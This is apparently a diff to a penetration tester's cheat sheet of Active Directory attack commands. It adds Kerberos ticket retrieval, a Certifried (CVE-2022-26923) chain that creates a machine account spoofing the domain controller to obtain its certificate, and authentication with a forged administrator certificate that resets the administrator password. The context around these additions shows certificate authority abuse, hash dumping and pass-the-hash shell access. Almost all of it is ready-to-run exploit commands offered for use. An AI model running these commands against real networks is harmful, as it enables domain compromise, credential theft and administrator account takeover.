@@ -535,8 +535,24 @@ WriteDacl
 WriteOwner
 
 [*] Active Directory: CS
++---------- .ccache ----------+
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+
 +---------- Certificate Authority ----------+
 export CA=
+
++---------- Certifried (CVE-2022-26923) ----------+
+https://legacy.thehacker.recipes/a-d/movement/ad-cs/certifried
+
+--> Add machine account with impersonated DNS and clear SPN
+certipy account create -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'mypc' -pass '123qweasdF!' -dns '$DC'; bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'mypc$' 'servicePrincipalName'
+
+--> Verify machine's attributes
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'mypc$' --attr dnsHostName,serviceprincipalname
+
+--> Request DC pfx
+certipy req -dc-ip $TARGET -u 'mypc$' -p '123qweasdF!' -ca 'DC01-CA' -template 'Machine'
 
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
@@ -554,10 +570,11 @@ certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' 
 certutil -store my
 certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
+certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
+change_password administrator 123qweasdF!
 
 +---------- Authenticate ----------+
 certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
-certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
